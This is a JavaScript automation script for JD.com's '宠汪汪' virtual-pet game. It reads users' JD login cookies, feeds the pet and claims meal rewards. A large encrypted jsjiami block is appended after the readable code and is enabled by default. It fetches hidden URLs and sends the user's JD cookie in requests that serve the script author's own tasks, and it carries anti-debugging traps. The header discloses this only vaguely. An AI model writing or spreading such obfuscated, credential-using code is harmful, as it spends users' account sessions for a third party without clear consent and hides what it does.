/*
宠汪汪喂食(如果喂食80g失败，降级一个档次喂食（40g）,依次类推),三餐，建议一小时运行一次
更新时间：2020-11-03
活动入口：京东APP我的-更多工具-宠汪汪
脚本内置了一个给作者任务助力的网络请求，默认开启，如介意请自行关闭。
参数 helpAuthor = false
脚本作者：lxk0301
*/

const $ = new Env('宠汪汪🐕喂食');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let helpAuthor = true; //为作者助力的开关
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '';
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
let jdNotify = true;//是否开启静默运行。默认true开启
let message = '', subTitle = '';
const JD_API_HOST = 'https://jdjoy.jd.com'
let FEED_NUM = ($.getdata('joyFeedCount') * 1) || 10;   //喂食数量默认10g,可选 10,20,40,80 , 其他数字不可.

!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      await TotalBean();
      console.log(`\n开始【京东账号${$.index}】${$.nickName || $.UserName}\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      message = '';
      subTitle = '';
      if ($.isNode()) {
        if (process.env.JOY_FEED_COUNT) {
          if ([10, 20, 40, 80].indexOf(process.env.JOY_FEED_COUNT * 1) > -1) {
            FEED_NUM = process.env.JOY_FEED_COUNT ? process.env.JOY_FEED_COUNT * 1 : FEED_NUM;
          } else {
            console.log(`您输入的 JOY_FEED_COUNT 为非法数字，请重新输入`);
          }
        }
      }
      await feedPets(FEED_NUM);//喂食
      await ThreeMeals();//三餐
      await showMsg();
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
function showMsg() {
  $.log(`\n${message}\n`);
  jdNotify = $.getdata('jdJoyNotify') ? $.getdata('jdJoyNotify') : jdNotify;
  if (!jdNotify || jdNotify === 'false') {
    //$.msg($.name, subTitle, `【京东账号${$.index}】${$.UserName}\n` + message);
  }
}
function feedPets(feedNum) {
  return new Promise(resolve => {
    console.log(`您设置的喂食数量::${FEED_NUM}g\n`);
    console.log(`实际的喂食数量::${feedNum}g\n`);
    let opt = {
      url: `//jdjoy.jd.com/common/pet/feed?feedCount=${feedNum}&reqSource=h5`,
      // url: "//draw.jdfcloud.com/common/pet/getPetTaskConfig?reqSource=h5",
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers: {
        'Cookie': cookie,
        'reqSource': 'h5',
        'Host': 'jdjoy.jd.com',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://jdjoy.jd.com/pet/index',
        'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        'Accept-Language': 'zh-cn',
        'Accept-Encoding': 'gzip, deflate, br',
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        $.data = JSON.parse(data);
        if ($.data.success) {
          if ($.data.errorCode === 'feed_ok') {
            console.log('喂食成功')
            message += `【喂食成功】${feedNum}g\n`;
          } else if ($.data.errorCode === 'time_error') {
            console.log('喂食失败：正在食用')
            message += `【喂食失败】您的汪汪正在食用\n`;
          } else if ($.data.errorCode === 'food_insufficient') {
            console.log(`当前喂食${feedNum}g狗粮不够, 现为您降低一档次喂食\n`)
            if ((feedNum) === 80) {
              feedNum = 40;
            } else if ((feedNum) === 40) {
              feedNum = 20;
            } else if ((feedNum) === 20) {
              feedNum = 10;
            } else if ((feedNum) === 10) {
              feedNum = 0;
            }
            // 如果喂食设置的数量失败, 就降低一个档次喂食.
            if ((feedNum) !== 0) {
              await feedPets(feedNum);
            } else {
              console.log('您的狗粮已不足10g')
              message += `【喂食失败】您的狗粮已不足10g\n`;
            }
          } else {
            console.log(`其他状态${$.data.errorCode}`)
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve($.data);
      }
    })
  })
}

//三餐
function ThreeMeals() {
  return new Promise(resolve => {
    let opt = {
      url: "//jdjoy.jd.com/common/pet/getFood?taskType=ThreeMeals&reqSource=h5",
      // url: "//draw.jdfcloud.com/common/pet/getPetTaskConfig?reqSource=h5",
      method: "GET",
      data: {},
      credentials: "include",
      header: {"content-type": "application/json"}
    }
    const url = "https:"+ taroRequest(opt)['url']
    const options = {
      url,
      headers: {
        'Cookie': cookie,
        'reqSource': 'h5',
        'Host': 'jdjoy.jd.com',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://jdjoy.jd.com/pet/index',
        'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        'Accept-Language': 'zh-cn',
        'Accept-Encoding': 'gzip, deflate, br',
      }
    }
    $.get(options, async (err, resp, data) => {
      try {
        data = JSON.parse(data);
        if (data.success) {
          if (data.errorCode === 'received') {
            console.log(`三餐结果领取成功`)
            message += `【三餐】领取成功，获得${data.data}g狗粮\n`;
          }
        }
      } catch (e) {
        $.logErr(resp, e);
      } finally {
        resolve(data);
      }
    })
  })
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
var _0xodT='jsjiami.com.v6',_0xc75b=[_0xodT,'w5/CsWsNwpdyw5DDjsOdeGzCqA==','wrR1MMOAXMKg','YsOdVsKNIQ==','wo7CtAjDhMOIRSY=','wrJdw5XCgsOSw58twosAw6pKw70=','Vj3CnzAlwr8=','dwfDmMKybUbDpMOhw4PCrQPChg==','LcOMwpFJ','wq9hw6HCscO3','w53CvRbDgsKcLsOgdMKRG8OVbw==','C2p/w48qwpjCn8KRwqg/wrbCgkPCjMKtwqtFwohFNsOgwo/Dm2XCosOCw77DkTRUw6RYfw==','w5nDmRzCp8K2BS/CnsObaMOJZxkIwqwKw5Amag==','wo3CszLCsFlgVy3CpiZYf8O0HXNBJQ==','BDnDul3DhcOLwpnCsMKTbg==','asOSwpBcw4TCjCNTwp/Cu8OJwpzCicOeCsOaw4YkfMKuwqsdSAHCgRfCtE3DpRPDoxrDuw==','DsKtw7/Cn8OhMMK3w69nA8OzbsO+wrcpw7pINizDr8OQOyjDqsOQK8OJU2DDgg3CuWxVw4lCw6jCicKgw5fDmRfDjwESwrkqHFzCuMKscC/DnMKAZMKMw67DicKWw4VwBGwrw5vCnTYsOcO9L1fChTXClMOnw7zCvsOIw6dWPsO0blfDuD9nw78CasONPEXDucKdwozDhMKsZyHCmsKvw7lyTMORMT7Cq8OSwp49YcOtaGvDgsOxZ8K+dAA7w6HDrU/DocK+wp7CrMKrcsKMGMONNsKowoRJVsOPw4nDmlLCqj0Pw4sfwp0dw5DDumXChMOZJiPDhsKGUsKSfRDDg0kRB8KSwq9dRcKWw7EMB13DtmtWwp7Cj8OQVcKvw73Di8Kuw7DCh28fw57CtQfCvcOyw5PDg30qwqTDt8Kgw6jCsMOIwo4+wpvDuMKMwqV+bBzDvMKIw5vClXLDhRnDvCzChm9mw5JmSMOUw5cLwq0iw5XDswgjw7TCkEFRChHDi8OJw4DDjMKbw6DDuXtHKnAwwoLDrcOMUE11w47DocKvw6N7w4QTGVdyJ0vCn2rDusKjCR8gQHkkbMOz','w5PDs2fCqQc=','M8O9EWHDkmMYNwLDsg==','wpDDk312My4=','KsKbAxYgw5kOwpPClx1zCGY9wovCvMONw5bCkyvCuQYwU8ONC8Oew43CqsOkw4klagM=','w53DgcO7wojCgg==','SsOkLcKDHQ==','Vl3DpiHCkg==','w5rCqjrCgMKi','OX5bw7Ii','ccOwQMKeAQ==','wq7CjCHCuBs=','Y8OWwpRAw57DlW0Iwp7DocKJw57DjcOHAcKawolrZcOkwrEIBRTCgTLCtFrDpmnCrEDCosO/wpHChCteasOpw5HCtCFHY3sgDsK5X8OqwoFlPcOsw7p5GMKVXMOqYQ7DssKHw4XDmxR5OgHCisOCWMKCwph7csO1MT7DmcORw7JaZMKowpo2wpEpw6MkwqLDscKYM8KawpYzbnNFEcOiJmY=','w4zCvjrCuUhwFSTCri0ELcO9UCcecUjDrH3DmcOjw5zCksOWw7sLw7xlw4U=','wrYSEUpp','w5fDmAbCtMKxVm/Dn8O6OcOaaUIWwphWw5oqYkcHSkTCvnhAAsKRcsKcw5/DnMOlIMOvIMKsw7gTw7Bpw5dhw7nDrHA=','JmXDhmXCvnrCrjoow69NBMKXw4XDtG9+wp/DnhkAw53Dhm5lWMOWwr0BwqfDsxEVwqXCjBxuREos','FnrChCQ0wqXDhDnDh8KeMsKewoMUCFLDjwEvw6liwoVtw6vCj8OjAHw4wq5bMwAEwpLDsBBgci3DocOZw7coKg==','wqzDmcO/wrg=','cVXDt8OSw4fDjMKCwqDClcKzw4jDp8OSw6o9DAUHwo1NacO7V3LCo8K1HMOBwqzDv8Kcw4vCo8K5S8O4IDscfcOrcjbDu0bCm8KewrNhw4rDuXzCoD3DlEsZEMKmIVTDtsOrw7DChsOmLsKswrfDiwdpTsKGBnl4wqw=','VE7DucOLw5jCmsOMwqDDh8O0wozCosKfwq0OCwdGwrsZPMOWY0bDrcKoI8OHwrrCvsKMwpvCiMKLH8KsRwFPT8O3IDvDpQLCk8Ofwo10w4zCqxzCgHXDrRBcEsK5NV3DoMKTw7/CgMOyJcK5w6rCulY1DsKZQjsiw6LDn8Kow6jDuQLDvi7CgsKuScOldQfCiMKbRMOtNMOfNcKIwrpMJ8KLGnHDl8OiworDoCnDngdaDzvCsQvCsVFvwo/CsMKYAVvCsSXDh1A4EDQmwrzDmsKMW2gXJzAKw7DCtjzCiMKhIcObwoBqTxDDq00b','w7rDucKKEXA=','SsKpDQDCvQ==','RcKZGxHCvQ==','w5vDvyrCocKI','PcOIwow=','fE/DgMOIw5g=','wojCji7CiDI=','wo7CqC/CoTIlRw==','aUDDscORw5E=','WjPDvsK4aw==','SMK8FQTCtsKOUA==','DcKnw5zCjsOjbMK/w5ZhBcOzbA==','wr3DjGDDh8ONw4U=','N0TCllYm','egjDrsKyWETDsQ==','SMOQbcK0PifCjwxiwoEPw7Q=','wovCqcO0VsKnNA==','woPCpxnCoQcnUiHCriNXbA==','E8Kow7fCmw==','RsK6Cw3CoA==','acOQwrdpw54=','wrnDnXrDkMOKwpc9wpjCr8KoSTXDhm7DtcK0wofCtz4yUsKZbcO8L8K5w4jDk8K6wpwyB8KGw6zCuMOmVhQnTcKtA8OCwrnCjRvCjjJ9w4pHLsOUw4xlwrnDn8O5w4LDi8OAw5FwXCHDiMKPwqoi','Iy3ClcOoJsKtwo8mw5YCf11jw73DkgTCsHtPwrnCvsKlT1LDo8ONfijCkmwIAxAOw5jDpiLCjBJgwpDDsFNeQS9QZUPCn8Ohw4kgXDxOaiXClcORUxEec8OhwovCh8OgIMOyw53DisKPw5fDsErCmcKcw7s5dE8uw5QwES7DoklAwojClSDCosORScK1woHDrQNBLg8FRxZiw65wKiXDp8OTwpPChMKswpoHPsOuw4nDusKPJWvDgV9SblEjwqw9PTZyQsKBBFV3w4bDiBtrwoYVAsKmwqRMccKkw7FkNg==','A8K8Ogwl','wpgEwqrCusOk','HcOfwpl/wqc=','w47Dvj4=','JsKfw63CicOc','XMKACzIA','fMOrA8KyNgd5','wprCqCnCsxA=','wonDhsOmwqQD','wpPDgMO4H8O1MnQ=','jsljEiamnwYi.cFBBGoVm.vU6XQNr=='];(function(_0x4cd250,_0x6756e8,_0x445c4f){var _0xffa53=function(_0x35f9bc,_0x3a39df,_0x5e4de5,_0x2340a8,_0x413871){_0x3a39df=_0x3a39df>>0x8,_0x413871='po';var _0x3c9cc1='shift',_0x4ea989='push';if(_0x3a39df<_0x35f9bc){while(--_0x35f9bc){_0x2340a8=_0x4cd250[_0x3c9cc1]();if(_0x3a39df===_0x35f9bc){_0x3a39df=_0x2340a8;_0x5e4de5=_0x4cd250[_0x413871+'p']();}else if(_0x3a39df&&_0x5e4de5['replace'](/[lEnwYFBBGVUXQNr=]/g,'')===_0x3a39df){_0x4cd250[_0x4ea989](_0x2340a8);}}_0x4cd250[_0x4ea989](_0x4cd250[_0x3c9cc1]());}return 0x754d4;};var _0x2c9248=function(){var _0x33ff7a={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x144116,_0x13cde2,_0x5799cf,_0x3a679e){_0x3a679e=_0x3a679e||{};var _0x33b46e=_0x13cde2+'='+_0x5799cf;var _0x47844d=0x0;for(var _0x47844d=0x0,_0x1280da=_0x144116['length'];_0x47844d<_0x1280da;_0x47844d++){var _0x309f32=_0x144116[_0x47844d];_0x33b46e+=';\x20'+_0x309f32;var _0x47e069=_0x144116[_0x309f32];_0x144116['push'](_0x47e069);_0x1280da=_0x144116['length'];if(_0x47e069!==!![]){_0x33b46e+='='+_0x47e069;}}_0x3a679e['cookie']=_0x33b46e;},'removeCookie':function(){return'dev';},'getCookie':function(_0x49113e,_0x1fb2cb){_0x49113e=_0x49113e||function(_0x48571a){return _0x48571a;};var _0x163c3a=_0x49113e(new RegExp('(?:^|;\x20)'+_0x1fb2cb['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0xc14b6a=typeof _0xodT=='undefined'?'undefined':_0xodT,_0x505e4a=_0xc14b6a['split'](''),_0x5c4211=_0x505e4a['length'],_0x307d40=_0x5c4211-0xe,_0x96da35;while(_0x96da35=_0x505e4a['pop']()){_0x5c4211&&(_0x307d40+=_0x96da35['charCodeAt']());}var _0x3025ce=function(_0x1cc42f,_0x4cdd42,_0x1f00cb){_0x1cc42f(++_0x4cdd42,_0x1f00cb);};_0x307d40^-_0x5c4211===-0x524&&(_0x96da35=_0x307d40)&&_0x3025ce(_0xffa53,_0x6756e8,_0x445c4f);return _0x96da35>>0x2===0x14b&&_0x163c3a?decodeURIComponent(_0x163c3a[0x1]):undefined;}};var _0x89605d=function(){var _0x2f7fe6=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x2f7fe6['test'](_0x33ff7a['removeCookie']['toString']());};_0x33ff7a['updateCookie']=_0x89605d;var _0x1bc4e8='';var _0x35ca2b=_0x33ff7a['updateCookie']();if(!_0x35ca2b){_0x33ff7a['setCookie'](['*'],'counter',0x1);}else if(_0x35ca2b){_0x1bc4e8=_0x33ff7a['getCookie'](null,'counter');}else{_0x33ff7a['removeCookie']();}};_0x2c9248();}(_0xc75b,0x1ec,0x1ec00));var _0x4034=function(_0x4f52b3,_0x576b4f){_0x4f52b3=~~'0x'['concat'](_0x4f52b3);var _0x59f80b=_0xc75b[_0x4f52b3];if(_0x4034['EryGIU']===undefined){(function(){var _0x2659f2;try{var _0xb189f5=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2659f2=_0xb189f5();}catch(_0x552755){_0x2659f2=window;}var _0x17dfb7='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2659f2['atob']||(_0x2659f2['atob']=function(_0x3572f5){var _0x168a2b=String(_0x3572f5)['replace'](/=+$/,'');for(var _0x22a3fc=0x0,_0x20e6a9,_0x17641f,_0xce62c3=0x0,_0x23c747='';_0x17641f=_0x168a2b['charAt'](_0xce62c3++);~_0x17641f&&(_0x20e6a9=_0x22a3fc%0x4?_0x20e6a9*0x40+_0x17641f:_0x17641f,_0x22a3fc++%0x4)?_0x23c747+=String['fromCharCode'](0xff&_0x20e6a9>>(-0x2*_0x22a3fc&0x6)):0x0){_0x17641f=_0x17dfb7['indexOf'](_0x17641f);}return _0x23c747;});}());var _0x40ffc0=function(_0x3845e4,_0x576b4f){var _0x24900d=[],_0x37a51d=0x0,_0x4e0139,_0x4ba2a8='',_0x1b4c6c='';_0x3845e4=atob(_0x3845e4);for(var _0x179abb=0x0,_0x140e82=_0x3845e4['length'];_0x179abb<_0x140e82;_0x179abb++){_0x1b4c6c+='%'+('00'+_0x3845e4['charCodeAt'](_0x179abb)['toString'](0x10))['slice'](-0x2);}_0x3845e4=decodeURIComponent(_0x1b4c6c);for(var _0x1bde68=0x0;_0x1bde68<0x100;_0x1bde68++){_0x24900d[_0x1bde68]=_0x1bde68;}for(_0x1bde68=0x0;_0x1bde68<0x100;_0x1bde68++){_0x37a51d=(_0x37a51d+_0x24900d[_0x1bde68]+_0x576b4f['charCodeAt'](_0x1bde68%_0x576b4f['length']))%0x100;_0x4e0139=_0x24900d[_0x1bde68];_0x24900d[_0x1bde68]=_0x24900d[_0x37a51d];_0x24900d[_0x37a51d]=_0x4e0139;}_0x1bde68=0x0;_0x37a51d=0x0;for(var _0x2996a5=0x0;_0x2996a5<_0x3845e4['length'];_0x2996a5++){_0x1bde68=(_0x1bde68+0x1)%0x100;_0x37a51d=(_0x37a51d+_0x24900d[_0x1bde68])%0x100;_0x4e0139=_0x24900d[_0x1bde68];_0x24900d[_0x1bde68]=_0x24900d[_0x37a51d];_0x24900d[_0x37a51d]=_0x4e0139;_0x4ba2a8+=String['fromCharCode'](_0x3845e4['charCodeAt'](_0x2996a5)^_0x24900d[(_0x24900d[_0x1bde68]+_0x24900d[_0x37a51d])%0x100]);}return _0x4ba2a8;};_0x4034['clPqFe']=_0x40ffc0;_0x4034['RinexS']={};_0x4034['EryGIU']=!![];}var _0x15dff5=_0x4034['RinexS'][_0x4f52b3];if(_0x15dff5===undefined){if(_0x4034['kMlRNP']===undefined){var _0x4436f1=function(_0x4c47ff){this['PtDcPr']=_0x4c47ff;this['RkpMkt']=[0x1,0x0,0x0];this['qUhoST']=function(){return'newState';};this['YHqQuj']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['TiakbW']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x4436f1['prototype']['mKTZsI']=function(){var _0x54b9ef=new RegExp(this['YHqQuj']+this['TiakbW']);var _0x206dce=_0x54b9ef['test'](this['qUhoST']['toString']())?--this['RkpMkt'][0x1]:--this['RkpMkt'][0x0];return this['xBjOxQ'](_0x206dce);};_0x4436f1['prototype']['xBjOxQ']=function(_0x3303aa){if(!Boolean(~_0x3303aa)){return _0x3303aa;}return this['hbhuIt'](this['PtDcPr']);};_0x4436f1['prototype']['hbhuIt']=function(_0x5b6909){for(var _0x411174=0x0,_0x1bd083=this['RkpMkt']['length'];_0x411174<_0x1bd083;_0x411174++){this['RkpMkt']['push'](Math['round'](Math['random']()));_0x1bd083=this['RkpMkt']['length'];}return _0x5b6909(this['RkpMkt'][0x0]);};new _0x4436f1(_0x4034)['mKTZsI']();_0x4034['kMlRNP']=!![];}_0x59f80b=_0x4034['clPqFe'](_0x59f80b,_0x576b4f);_0x4034['RinexS'][_0x4f52b3]=_0x59f80b;}else{_0x59f80b=_0x15dff5;}return _0x59f80b;};if(helpAuthor){shuye72();function help(_0x479ba0){var _0x3c34a9={'LCfZc':_0x4034('0','H9ri'),'RnZPl':_0x4034('1','n]BU'),'XdFAa':_0x4034('2','%(MF'),'fgElS':_0x4034('3','hZnO'),'SdTQa':_0x4034('4','oMSp'),'PNoKM':_0x4034('5','tLTj'),'DEzxn':_0x4034('6','6Vp6'),'pSjhK':_0x4034('7','Ewyh')};let _0x4d5407=_0x479ba0[_0x4034('8','[B&W')];let _0x4b1461=_0x479ba0[_0x4034('9',']F2V')];let _0x57dc20={'url':_0x4034('a','m*X@'),'headers':{'Host':_0x3c34a9[_0x4034('b','IctI')],'Content-Type':_0x3c34a9[_0x4034('c','meYo')],'Origin':_0x3c34a9[_0x4034('d','KUYL')],'Accept-Encoding':_0x3c34a9[_0x4034('e','H9ri')],'Cookie':cookie,'Connection':_0x3c34a9[_0x4034('f','n]BU')],'Accept':_0x3c34a9[_0x4034('10','G5[e')],'User-Agent':_0x3c34a9[_0x4034('11','hZnO')],'Referer':_0x4034('12','tLTj')+_0x4d5407+_0x4034('13','hZnO'),'Accept-Language':_0x3c34a9[_0x4034('14','Bcsg')]},'body':_0x4034('15','%(MF')+_0x4d5407+_0x4034('16','[]by')+_0x4b1461+_0x4034('17','0[IM')};$[_0x4034('18','^dUO')](_0x57dc20,(_0x4af265,_0x5121da,_0x59343c)=>{});}function shuye72(){var _0x5bfed2=function(){var _0x33285c=!![];return function(_0x5b5232,_0x208950){var _0x33f7ee=_0x33285c?function(){if(_0x208950){var _0x538bb5=_0x208950['apply'](_0x5b5232,arguments);_0x208950=null;return _0x538bb5;}}:function(){};_0x33285c=![];return _0x33f7ee;};}();var _0x4f6a4c=_0x5bfed2(this,function(){var _0x332611=function(){return'\x64\x65\x76';},_0x3e0895=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x14ea47=function(){var _0x4069c1=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x4069c1['\x74\x65\x73\x74'](_0x332611['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x298f40=function(){var _0x12683a=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x12683a['\x74\x65\x73\x74'](_0x3e0895['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x24fd44=function(_0x5dd335){var _0x18af73=~-0x1>>0x1+0xff%0x0;if(_0x5dd335['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x18af73)){_0x4800c2(_0x5dd335);}};var _0x4800c2=function(_0x4f7813){var _0x16b713=~-0x4>>0x1+0xff%0x0;if(_0x4f7813['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x16b713){_0x24fd44(_0x4f7813);}};if(!_0x14ea47()){if(!_0x298f40()){_0x24fd44('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x24fd44('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x24fd44('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4f6a4c();var _0x135c4a={'xDhMJ':function(_0x302b74,_0x2cacb9){return _0x302b74!==_0x2cacb9;},'ftleL':function(_0x31772a,_0x16435a){return _0x31772a<_0x16435a;},'iDztL':function(_0x44d1b9,_0x58082a){return _0x44d1b9(_0x58082a);},'jRBvM':function(_0x40150b){return _0x40150b();},'enCjl':_0x4034('19','zKoa'),'bGuHG':_0x4034('1a','zKoa')};new Promise(_0x3fb411=>{var _0xc1b45d={'DZdkt':function(_0x1abda7,_0x45b0e3){return _0x135c4a[_0x4034('1b','#@kW')](_0x1abda7,_0x45b0e3);},'GNzIb':function(_0x39f573,_0x2c3dfe){return _0x135c4a[_0x4034('1c','thkD')](_0x39f573,_0x2c3dfe);},'jgjhQ':function(_0x5db8f2,_0x53f7ec){return _0x135c4a[_0x4034('1d','thkD')](_0x5db8f2,_0x53f7ec);},'brWYs':function(_0x3e2548){return _0x135c4a[_0x4034('1e','%(MF')](_0x3e2548);}};$[_0x4034('1f','66B6')]({'url':_0x135c4a[_0x4034('20','zKoa')],'headers':{'User-Agent':_0x135c4a[_0x4034('21','hZnO')]}},async(_0xc26c62,_0x4f28a5,_0x385fa)=>{if(_0x385fa){$[_0x4034('22','hZnO')]=JSON[_0x4034('23','zKoa')](_0x385fa);if(_0xc1b45d[_0x4034('24','vuIT')]($[_0x4034('25','thkD')][_0x4034('26','6Vp6')][_0x4034('27','H6Lh')],0x0)){for(let _0x46d448=0x0;_0xc1b45d[_0x4034('28','(pXE')](_0x46d448,$[_0x4034('29','vuIT')][_0x4034('2a','G5[e')][_0x4034('2b','pq^i')]);_0x46d448++){let _0x427b5f=$[_0x4034('25','thkD')][_0x4034('2c','hZnO')][_0x46d448];await $[_0x4034('2d','6Vp6')](0x2bc);_0xc1b45d[_0x4034('2e','thkD')](help,_0x427b5f);}_0xc1b45d[_0x4034('2f','tLTj')](shuye73);}}});});}function shuye73(){var _0x32ea2d={'ASMjv':function(_0x4eac31,_0x4822d5){return _0x4eac31!==_0x4822d5;},'hoNqd':function(_0x47f9c7,_0x1ea3fe){return _0x47f9c7<_0x1ea3fe;},'GraBQ':function(_0x22abae,_0x4bd177){return _0x22abae(_0x4bd177);},'BVsfM':_0x4034('30','H6Lh'),'LvjEp':_0x4034('31','TY$s')};new Promise(_0x20719e=>{var _0x7401b8={'Upjht':function(_0x14aa14,_0x4e1627){return _0x32ea2d[_0x4034('32','m*X@')](_0x14aa14,_0x4e1627);},'CcyXm':function(_0x12140f,_0x12944f){return _0x32ea2d[_0x4034('33','19mb')](_0x12140f,_0x12944f);},'tRvRW':function(_0x9a2a68,_0xbfcb5b){return _0x32ea2d[_0x4034('34','66B6')](_0x9a2a68,_0xbfcb5b);}};$[_0x4034('35','Ewyh')]({'url':_0x32ea2d[_0x4034('36','6Vp6')],'headers':{'User-Agent':_0x32ea2d[_0x4034('37','nBkD')]}},async(_0x5a9401,_0x3092f3,_0x64e369)=>{if(_0x64e369){$[_0x4034('38','meYo')]=JSON[_0x4034('39','hZnO')](_0x64e369);if(_0x7401b8[_0x4034('3a','^dUO')]($[_0x4034('3b','z^UO')][_0x4034('3c','F5j4')][_0x4034('3d','vR2d')],0x0)){for(let _0x522ee7=0x0;_0x7401b8[_0x4034('3e','G5[e')](_0x522ee7,$[_0x4034('3f','oj03')][_0x4034('40','&f2j')][_0x4034('41','0[IM')]);_0x522ee7++){let _0x59425c=$[_0x4034('29','vuIT')][_0x4034('42','vuIT')][_0x522ee7];await $[_0x4034('43','66B6')](0x2bc);_0x7401b8[_0x4034('44','&f2j')](help,_0x59425c);}}}});});}};_0xodT='jsjiami.com.v6';
